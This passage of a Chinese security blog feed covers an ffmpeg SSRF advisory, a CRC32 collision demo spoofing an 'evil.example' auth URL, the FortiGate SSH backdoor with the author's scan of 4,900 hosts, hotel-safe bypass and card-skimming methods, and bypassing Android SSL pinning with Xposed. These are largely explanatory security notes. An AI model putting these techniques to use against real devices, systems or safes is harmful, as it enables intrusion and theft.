<h1 id="参考资料">参考资料</h1><p><a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">通过 ffmpeg 的播放列表实现 SSRF 以及窃取文件</a><br><a href="http://seclists.org/oss-sec/2016/q1/85" target="_blank" rel="external">http://seclists.org/oss-sec/2016/q1/85</a><br><a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1897" target="_blank" rel="external">http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1897</a><br><a href="https://www.ffmpeg.org/ffmpeg-protocols.html#concat" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#concat</a><br><a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a><br><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter" target="_blank" rel="external">https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter</a><br><a href="http://www.kernelpicnic.net/2015/11/29/9447CTF-Super-Turbo-Atomic-GIF-Converter-Write-Up.html" target="_blank" rel="external">http://www.kernelpicnic.net/2015/11/29/9447CTF-Super-Turbo-Atomic-GIF-Converter-Write-Up.html</a><br><a href="https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web180-gif-converter" target="_blank" rel="external">https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web180-gif-converter</a><br><a href="http://pastebin.com/FrsQinQz" target="_blank" rel="external">http://pastebin.com/FrsQinQz</a><br><a href="https://gist.github.com/Invizory/e45e1ee54cf0687f2002" target="_blank" rel="external">https://gist.github.com/Invizory/e45e1ee54cf0687f2002</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="漏洞预警">漏洞预警</h1><p>这个漏洞关注度不高，最先被人知道应该是俄罗斯人写的<a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">]]>
    </summary>
    
      <category term="ffmpeg" scheme="http://xdxd.love/tags/ffmpeg/"/>
    
      <category term="漏洞挖掘" scheme="http://xdxd.love/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[mysql表名大小写敏感问题]]></title>
    <link href="http://xdxd.love/2016/01/18/mysql%E8%A1%A8%E5%90%8D%E5%A4%A7%E5%B0%8F%E5%86%99%E6%95%8F%E6%84%9F%E9%97%AE%E9%A2%98/"/>
    <id>http://xdxd.love/2016/01/18/mysql表名大小写敏感问题/</id>
    <published>2016-01-18T08:38:54.000Z</published>
    <updated>2016-01-18T08:52:47.000Z</updated>
    <content type="html"><![CDATA[<p>测试一个程序，提示找不到表。数据库看了一下表都存在的啊。貌似就大小写不对。抓执行的sql语句看了一下：</p>
<p><img src="/images/mysqltable1.png" alt=""><br>发现同一个表既有使用大写也有使用小写，也是醉了。google: mysql table name case sensitive就可以找到解决方案。参考mysql的文档:<a href="http://dev.mysql.com/doc/refman/5.7/en/identifier-case-sensitivity.html" target="_blank" rel="external">9.2.2 Identifier Case Sensitivity</a></p>
<p>windows上默认不区分大小写，但是linux上默认区分大小写。可以通过lower_case_table_names参数调整。设置lower_case_table_names=1可以不区分大小写。</p>
<p><img src="/images/mysqltable2.png" alt=""></p>
<p>我这里使用了官方的mysql docker镜像来做测试环境，只要添加一个启动参数就可以了。</p>
<pre><code>docker <span class="keyword">run</span> -<span class="keyword">d</span> -p 3306:3306 --name=appmysql5 -<span class="keyword">e</span> MYSQL_PASS=<span class="string">"root"</span> -<span class="keyword">e</span> MYSQL_USER=<span class="string">"root"</span>  -<span class="keyword">e</span> EXTRA_OPTS=<span class="string">"--log-raw"</span> -<span class="keyword">e</span> EXTRA_OPTS=<span class="string">"--lower_case_table_names=1"</span>  xd/mysql5.6:v1
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<p>测试一个程序，提示找不到表。数据库看了一下表都存在的啊。貌似就大小写不对。抓执行的sql语句看了一下：</p>
<p><img src="/images/mysqltable1.png" alt=""><br>发现同一个表既有使用大写也有使用小写，也是醉了。google: ]]>
    </summary>
    
      <category term="mysql" scheme="http://xdxd.love/tags/mysql/"/>
    
      <category term="奇技淫巧" scheme="http://xdxd.love/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CRC32算法碰撞测试]]></title>
    <link href="http://xdxd.love/2016/01/14/CRC32%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E5%92%8C%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/"/>
    <id>http://xdxd.love/2016/01/14/CRC32算法详解和使用场景/</id>
    <published>2016-01-14T06:52:35.000Z</published>
    <updated>2016-01-15T02:21:58.000Z</updated>
    <content type="html"><![CDATA[<h1 id="CRC32算法概述">CRC32算法概述</h1><p>CRC全称Cyclic Redundancy Check，又叫循环冗余校验。CRC32跟md5，sha1一样都是哈希算法的一种。crc32的优势是速度快，它被设计的目的是用来检测数据在网络传输过程中可能出现的随机错误。它跟md5和sha1有本质的区别就是它不是一种加密hash算法或者叫not cryptographically secure或者not cryptographic hashing。加密哈希算法的特征比如空间极大，碰撞概率极低，对于给定的哈希值难以找到另一个哈希值相同的字符串等crc32都不具备。</p>
<h1 id="CRC32算法原理">CRC32算法原理</h1><p>前面说到crc32的一些特性，这个要从crc32的原理开始分析。crc32的数学原理看起来还是有点复杂的,我也理解不透彻。简单一点理解就是把需要进行校验的数据选定一个除数进行一次除法运算，称为模2除法，跟通常二进制除法规则不同，得到的余数作为循环冗余码。数据接收端接收到数据之后进行同样的运算，即可判断数据在传输过程中是否出现了变化。当然具体的计算方式会复杂的多。这里说的不当的地方或者有更好的表达方式欢迎讨论。</p>
<h1 id="CRC32算法碰撞和破解">CRC32算法碰撞和破解</h1><p>crc32碰撞的概率非常高，根据一些测试结果<a href="http://blog.csdn.net/yunhua_lee/article/details/42775039" target="_blank" rel="external">CRC32算法冲突概率测试和分析</a>,对于随机数据的碰撞概率测试1820W数据，冲突数量是38638个。根据crc32的算法可以直接逆向找到相同crc32的字符串。<a href="https://github.com/theonlypwner/crc32" target="_blank" rel="external">脚本地址</a></p>
<p><img src="/images/crc321.png" alt=""></p>
<p>对于给定的字符串进行padding暴力破解在短时间内是一定可以获得相同crc32结果的。测试脚本：<a href="https://github.com/stayliv3/blog_material/blob/master/crc-collision/crc-collision.py" target="_blank" rel="external">crc-collision</a><br>下面两个字符串是有相同的CRC32值。</p>
<pre><code>import binascii
print binascii.<span class="function"><span class="title">crc32</span><span class="params">(<span class="string">'{"auth_url": "https://www.evil.example"}'</span> + <span class="string">' '</span>*<span class="number">2303357834</span>)</span></span>
print binascii.<span class="function"><span class="title">crc32</span><span class="params">(<span class="string">'{"auth_url": "https://www.google.com"}'</span>)</span></span>
</code></pre><p><img src="/images/crc322.png" alt=""></p>
<h1 id="CRC32算法的使用场景">CRC32算法的使用场景</h1><p>CRC32的设计初衷是用来检测底层网络传输数据时由于网络问题导致的数据出错。所以多用在底层网络设备中。应用层也有一些使用场景。但是不能用来做加密hash即sha256函数做的事情，比如用来做签名。crc32是无法保证数据完整性的。它只能用来检测异常不能用来对抗恶意的行为。最近在对一个认证系统做审计的时候发现使用了crc32做数据签名。所以有了对crc32碰撞的测试。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="CRC32算法概述">CRC32算法概述</h1><p>CRC全称Cyclic Redundancy Check，又叫循环冗余校验。CRC32跟md5，sha1一样都是哈希算法的一种。crc32的优势是速度快，它被设计的目的是用来检测数据在网络传输过程中可能出现的]]>
    </summary>
    
      <category term="CRC" scheme="http://xdxd.love/tags/CRC/"/>
    
      <category term="加密解密" scheme="http://xdxd.love/categories/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[飞塔FortiGate SSH后门事件]]></title>
    <link href="http://xdxd.love/2016/01/13/%E9%A3%9E%E5%A1%94FortiGate-SSH%E5%90%8E%E9%97%A8%E4%BA%8B%E4%BB%B6/"/>
    <id>http://xdxd.love/2016/01/13/飞塔FortiGate-SSH后门事件/</id>
    <published>2016-01-13T02:35:51.000Z</published>
    <updated>2016-01-13T09:21:13.000Z</updated>
    <content type="html"><![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://tools.pwn.ren/2016/01/12/ssh-backdoor-for-fortigate-os-version-4-up-to-5-0-7.html" target="_blank" rel="external">飞塔系统存在SSH后门 影响版本 4.0 – 5.0.7！！</a></p>
<p><a href="http://tools.pwn.ren/2016/01/12/ssh-backdoor-for-fortigate-os-version-4-x-up-to-5-0-7%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%A9%E7%94%A8-html.html" target="_blank" rel="external">飞塔SSH后门 进一步利用方法</a></p>
<p><a href="http://tools.pwn.ren/2016/01/12/%E9%9A%8F%E6%9C%BA4900%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%A0%B7%E6%9C%AC%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A.html" target="_blank" rel="external">飞塔SSH后门 4900台机器样本测试报告</a></p>
<p><a href="http://seclists.org/fulldisclosure/2016/Jan/26" target="_blank" rel="external">SSH Backdoor for FortiGate OS Version 4.x up to 5.0.7</a></p>
<p><a href="https://www.zoomeye.org/search?q=FortiSSH%20country:Thailand&amp;t=host" target="_blank" rel="external">zoomeye.org</a></p>
<h1 id="思考">思考</h1><p>随着全网数据的平台越来越多，shodan，zoomeye，censys等。一旦有通用性的漏洞爆出来，很快就会对漏洞对全球的影响有了一个评估。如果平时对数据分析全面，可以迅速利用这种漏洞渗透目标。过两天应该会有对该漏洞详细的技术分析出现。</p>
<p>对于这种事总是细思极恐的感觉。比较有意思的是从安全事件中对安全防御的思考。余弦的微博：</p>
<p><img src="/images/fortygate1.png" alt=""></p>
<p>网路游侠微博：<br><img src="/images/fortygate2.png" alt=""></p>
<p>从技术角度来说，一个漏洞就是一个漏洞，一个可能导致风险的问题。可是像防火墙后门这种漏洞，可以直接渗透内网，而且存在这么多年，会不会有人利用过，回答可能是肯定的。虽然做防御的时候肯定要考虑如果别人进来了怎么办，可是有时候进来可能很简单，人家是有核武器的。</p>
<h1 id="测试">测试</h1><p><a href="http://tools.pwn.ren/2016/01/12/%E9%9A%8F%E6%9C%BA4900%E5%8F%B0%E6%9C%BA%E5%99%A8%E6%A0%B7%E6%9C%AC%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A.html" target="_blank" rel="external">飞塔SSH后门 4900台机器样本测试报告</a></p>
<p>这里使用的脚本需要稍微修改一下，</p>
<pre><code><span class="keyword">for</span> <span class="tag">i</span> <span class="keyword">in</span> ips:
    <span class="tag">q</span>.<span class="function"><span class="title">put</span><span class="params">(ips)</span></span>
</code></pre><p>改成：</p>
<pre><code><span class="keyword">for</span> <span class="tag">i</span> <span class="keyword">in</span> ips:
    <span class="tag">q</span>.<span class="function"><span class="title">put</span><span class="params">(i)</span></span>
</code></pre><p>不知道是不是故意的。。。</p>
<p>这里测试的时候没有筛选开放22端口的主机，直接对4900机器进行测试，最后存在漏洞的机器为858台。相关的脚本和数据地址。<a href="https://github.com/stayliv3/blog_material/tree/master/fortigate" target="_blank" rel="external">https://github.com/stayliv3/blog_material/tree/master/fortigate</a></p>
<p><img src="/images/fortygate3.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://tools.pwn.ren/2016/01/12/ssh-backdoor-for-fortigate-os-version-4-up-to-5-0-7.html" target="_blank"]]>
    </summary>
    
      <category term="黑盒测试" scheme="http://xdxd.love/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[保险箱安全分析]]></title>
    <link href="http://xdxd.love/2016/01/13/%E4%BF%9D%E9%99%A9%E7%AE%B1%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/01/13/保险箱安全分析/</id>
    <published>2016-01-13T01:50:05.000Z</published>
    <updated>2016-01-13T01:59:05.000Z</updated>
    <content type="html"><![CDATA[<p>参加freebuf的FIT大会，黑客叔叔演示了现场破解保险箱。他说道了有比较多的方法可以破解保险箱，比如可以设置多组密码，如果只设置了一组的话，其他组的默认密码还是123456.可以使用树莓派模拟信号秒开保险箱，备用钥匙安全性很低等。</p>
<p>想起之前翻译的一篇国外的博客。Freebuf地址<a href="http://www.freebuf.com/news/special/38727.html" target="_blank" rel="external">走进科学：酒店保险箱真的保险么？</a></p>
<p>本文是FreeBuf《走进科学》系列最新力作，翻译自国外安全组织G DATA SecurityLabs一篇针对酒店保险箱的分析报告。他们的研究对象是一款产自中国并且以很多不同的品牌出售的保险柜（made in China and is sold under many different brands）。相信读完本文之后大家会对酒店保险箱的安全性有一些新的认识。</p>
<p>保险箱介绍</p>
<p>下图中是一个标准的酒店保险箱。外壳是钢制的，自带电池，即使断电依然可以工作。通常打开保险箱的方式有两种，使用PIN码(4到10位的数字)或者刷信用卡。此外使用应急钥匙也可以打开保险箱。只是顾客是拿不到的，只有酒店的管理者才有这把钥匙。主要是当顾客忘记PIN码，电池没电又停电或者顾客离开酒店但是没有打开保险箱的情况下使用。</p>
<p><img src="http://image.3001.net/images/20140721/1405934456300.png!small" alt=""><br>图中金色的铁片遮盖了钥匙孔。解开这两个螺丝，就可以看到插应急钥匙的地方。视频演示1（Youtube)：正常情况下打开和锁定保险柜。<br>保险箱工作原理</p>
<p>保险箱由3个部分组成。钢制的箱体本身，前输入面板–包括PIN码输入和信用卡读卡器，位于门后的控制系统。<br><img src="http://image.3001.net/images/20140721/14059344754543.png!small" alt=""><br>为了更好的理解内部结构，我们把门拆开看一下。</p>
<p><img src="http://image.3001.net/images/20140721/14059345065928.png!small" alt=""></p>
<p><img src="http://image.3001.net/images/20140721/1405934503295.png!small" alt=""></p>
<p>仔细看一下控制系统就会发现插应急钥匙的钥匙孔。还有用于开门的小马达和一块电路板。当用户输入PIN码的时候，电路板会检查PIN码是否正确。如果正确，则会启动马达。演示视频2（Youtube）。</p>
<p>Hacking 1:打开保险箱</p>
<p>超级管理密码：</p>
<p>最简单的方法是使用超级管理密码。使用超级管理密码可以配置保险箱，查看保险箱使用记录，当然也能打开保险箱。默认的超级密码是一串简单的数字序列。启动超级密码输入的方式是快速按两次#号键。当然，超级密码是可以被修改的。但是在我们的测试过程中发现大量的保险箱都是默认的超级密码。</p>
<p>开锁器</p>
<p>应急钥匙是一种机械的开门方式。开起来钥匙还是挺复杂的。</p>
<p><img src="http://image.3001.net/images/20140721/14059345965151.png!small" alt=""></p>
<p><img src="http://image.3001.net/images/20140721/14059345972381.png!small" alt=""></p>
<p>图中可以看到钥匙有4个部分。对于我们这种初学者，这种程度的钥匙还是挺复杂的。不过幸运的是制造商帮了我们一个忙。钥匙的四个面中，真正起作用的只有一个面。(这是吐槽中国特色的节奏么。。）</p>
<p>演示视频3：不用钥匙，手动开锁。<br>人工短路，破坏保险箱逻辑</p>
<p>第三种hack的方式是通过人工短路来模拟保险箱打开的信号。为了理解这种技术的原理，我们先看一下保险箱如何检测门是否打开的。</p>
<p><img src="http://image.3001.net/images/20140721/1405934653165.png!small" alt=""></p>
<p><img src="http://image.3001.net/images/20140721/14059346582376.png!small" alt=""></p>
<p>通过上图可以看到，门开的时候会按压一个绿色的连接器，在电路板上形成一个短路信号。我们测试的攻击场景是这样的：</p>
<p>1.关闭保险箱。<br>2.在保险箱的控制系统上引起一个短路，让保险箱认为自己的门打开了。(事实上门依然关闭的）<br>3.这时候，保险箱显示的不是等待打开保险箱的PIN码，而是变成等待输入一个新的PIN码用来关闭保险箱。<br>4.我们输入一个新的PIN码。<br>5.然后保险箱会尝试关闭门。(事实上门已经是关闭的了）<br>6.新输入的PIN码可以用来打开保险箱。<br>这种方式的难点在于如何从外部引起保险箱的短路。我们从固定保险箱logo的螺丝孔插入了一根铁丝。在我们的测试中，使用如此简单的工具，大概30分钟左右，可以成功引起保险箱短路。专业的窃贼的话，可以利用更加合适的工具，应该缩短这个时间。<br>Hacking 2:使用信用卡的风险<br>前面介绍过，保险箱也可以使用信用卡来锁定和打开。经过我们测试发现，这个场景中只能使用信用卡，其他的磁卡是不行的。系统会检查所用的磁卡是否是信用卡。<br><img src="http://image.3001.net/images/20140721/14059346854833.png!small" alt=""></p>
<p>信用卡信息可以被窃取么</p>
<p>我们经常看到有犯罪分子在ATM机上加装设备，获取银行卡信息。如下图所示就是常用来窃取银行卡信息的设备。</p>
<p><img src="http://image.3001.net/images/20140721/14059347247265.jpg!small" alt=""></p>
<p><img src="http://image.3001.net/images/20140721/14059347426365.jpg!small" alt=""></p>
<p>在我们的例子中，实现窃取信用卡信息也不困难。我们使用Arduino Uno board来完成了这个任务。</p>
<p><img src="http://image.3001.net/images/20140721/14059347629772.png!small" alt=""></p>
<p>如图所示，并不需要多少空间就可以装下这个自制的设备。通过这个装置，可以读取到信用卡的号码，所有人的名字以及卡片的过期时间。下面是读取到的一张信用卡的截图。</p>
<p><img src="http://image.3001.net/images/20140721/14059347747487.png!small" alt=""></p>
<p>结论：</p>
<p>经过以上的分析可以看出，我们分析的这一款保险箱安全级别并不是特别高。我们可以轻易的使用几种不同的方式来打开它。对于酒店的管理者，建议修改保险柜的默认超级密码。对于用户，我们建议不要过分依赖酒店的保险箱。而且尽量不要使用信用卡来开关保险箱，这样存在信用卡信息别盗的风险。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>参加freebuf的FIT大会，黑客叔叔演示了现场破解保险箱。他说道了有比较多的方法可以破解保险箱，比如可以设置多组密码，如果只设置了一组的话，其他组的默认密码还是123456.可以使用树莓派模拟信号秒开保险箱，备用钥匙安全性很低等。</p>
<p>想起之前翻译的一篇国外的]]>
    </summary>
    
      <category term="保险箱" scheme="http://xdxd.love/tags/%E4%BF%9D%E9%99%A9%E7%AE%B1/"/>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[无状态协议中认证状态保持方案的一些思考]]></title>
    <link href="http://xdxd.love/2016/01/07/%E6%97%A0%E7%8A%B6%E6%80%81%E5%8D%8F%E8%AE%AE%E4%B8%AD%E8%AE%A4%E8%AF%81%E7%8A%B6%E6%80%81%E4%BF%9D%E6%8C%81%E6%96%B9%E6%A1%88%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <id>http://xdxd.love/2016/01/07/无状态协议中认证状态保持方案的一些思考/</id>
    <published>2016-01-07T03:12:42.000Z</published>
    <updated>2016-01-11T09:03:14.000Z</updated>
    <content type="html"><![CDATA[<p>给文章起了一个高大上的名字，主要是想写一下对于http协议中用户登陆之后，如何进行用户身份跟踪，以及不同的实现方案可能存在的安全问题。</p>
<h1 id="何为登陆">何为登陆</h1><p><a href="https://en.wikipedia.org/wiki/Login" target="_blank" rel="external">login维基百科</a>上解释是一个用户通过认证获得一个系统的访问权限的过程。感觉更多的是一种业务上的描述，在讨论安全架构设计的时候都是使用identity,authentication等词语描述。</p>
<h1 id="何为认证_authentication">何为认证 authentication</h1><h1 id="不同的认证方式">不同的认证方式</h1><p>认证有不少协议，参考<a href="https://en.wikipedia.org/wiki/Basic_access_authentication" target="_blank" rel="external">Basic access authentication</a></p>
<h1 id="最常见的情形">最常见的情形</h1><p>在web应用中，通常都是web表单提交用户名密码的方式实现登陆。登陆之后，服务端会写一些信息到cookie中，以后的访问通过cookie中的信息来识别该请求的来源用户身份。</p>
<p>在比较早的应用中还可以看到服务端将用户名和密码保存在cookie中，服务端对每个请求，都会验证验证cookie中的用户名和密码是否正确。这种实现方案虽然在功能上实现了保持用户的身份状态。但是有比较高的安全风险。现在基本上很少见这种实现了。</p>
<p>目前最常见的两种方式，一种是使用sessionID的方式来跟踪用户，一种是将加密后的用户id或者用户id和密码保存在cookie中。以前我一直以为使用sessionID的方式才是最佳实践，把用户信息加密之后放在客户端是一种违背了安全设计思路的事情。但是看到<a href="http://drops.wooyun.org/papers/1449" target="_blank" rel="external">Codeigniter</a>作为流行的框架，也是采用了这种设计。</p>
<p>其实仔细思考一下，可以认为这是两种不同的设计方式，各有优劣，只要设计得当，都可以做到安全。采用sessionid的方式一定要有一个集中的管理session数据的中心，而采用加密算法的方式可以认为是将数据查询的过程转化成了cpu操作的加解密。这样子就不需要依赖集中的数据中心可以方便的实现分布式。</p>
<p>使用sessionid的方式，需要一个中心管理session数据<br><img src="/images/denglu1.png" alt=""></p>
<p>使用加解密用户数据的方式维持登录状态不需要数据查询，只需要cpu加解密操作就可以。</p>
<p><img src="/images/denglu2.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>给文章起了一个高大上的名字，主要是想写一下对于http协议中用户登陆之后，如何进行用户身份跟踪，以及不同的实现方案可能存在的安全问题。</p>
<h1 id="何为登陆">何为登陆</h1><p><a href="https://en.wikipedia.org/wiki/]]>
    </summary>
    
      <category term="sso" scheme="http://xdxd.love/tags/sso/"/>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[利用xposed绕过安卓SSL证书的强校验]]></title>
    <link href="http://xdxd.love/2015/12/30/%E5%88%A9%E7%94%A8xposed%E7%BB%95%E8%BF%87%E5%AE%89%E5%8D%93SSL%E8%AF%81%E4%B9%A6%E7%9A%84%E5%BC%BA%E6%A0%A1%E9%AA%8C/"/>
    <id>http://xdxd.love/2015/12/30/利用xposed绕过安卓SSL证书的强校验/</id>
    <published>2015-12-30T02:51:31.000Z</published>
    <updated>2015-12-30T03:03:50.000Z</updated>
    <content type="html"><![CDATA[<h1 id="什么是SSL_pinning">什么是SSL pinning</h1><p>https协议验证服务器身份的方式通常有三种，一是根据浏览器或者说操作系统（Android）自带的证书链；二是使用自签名证书；三是自签名证书加上SSL Pinning特性。第一种需要到知名证书机构购买证书，需要一定预算。第二种多见于内网使用。第三种在是安全性最高的，但是需要浏览器插件或客户端使用了SSL Pinning特性。<br>Android应用程序在使用https协议时也使用类似的3种方式验证服务器身份，分别是系统证书库、自带证书库、自带证书库 + SSL Pinning特性。<br>所以SSL Pinning，即SSL证书绑定，是验证服务器身份的一种方式，是在https协议建立通信时增加的代码逻辑，它通过自己的方式验证服务器身份，然后决定通信是否继续下去。它唯一指定了服务器的身份，所以安全性较高。</p>
<p><img src="/images/xposed1.png" alt=""></p>
<h1 id="JustTrustMe">JustTrustMe</h1><p>当客户端使用了SSL pinning的时候，手机导入burpsuite证书的方式也无法抓到通信包。除了修改apk验证证书逻辑重新打包的方式外，最简单的方法是使用xposed相关模块。</p>
<p>xposed安装方法：</p>
<p><a href="http://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="external">下载xposed安装包</a></p>
<p>安装xposed框架到手机：</p>
<pre><code>adb install <span class="tag">&lt;<span class="title">xposed-installer-you-just-downloaded</span>&gt;</span>.apk
</code></pre><p>安装并启用<a href="https://github.com/Fuzion24/JustTrustMe" target="_blank" rel="external">justtrustme模块</a></p>
<p>重启手机就可以抓到之前抓不到的https通信了。</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://www.nsfocus.com.cn/upload/contents/2015/07/2015_07241353337959.pdf" target="_blank" rel="external">http://www.nsfocus.com.cn/upload/contents/2015/07/2015_07241353337959.pdf</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="什么是SSL_pinning">什么是SSL pinning</h1><p>https协议验证服务器身份的方式通常有三种，一是根据浏览器或者说操作系统（Android）自带的证书链；二是使用自签名证书；三是自签名证书加上SSL Pinning特性。第一种需要到知名]]>
    </summary>
    
      <category term="xposed" scheme="http://xdxd.love/tags/xposed/"/>
    
      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
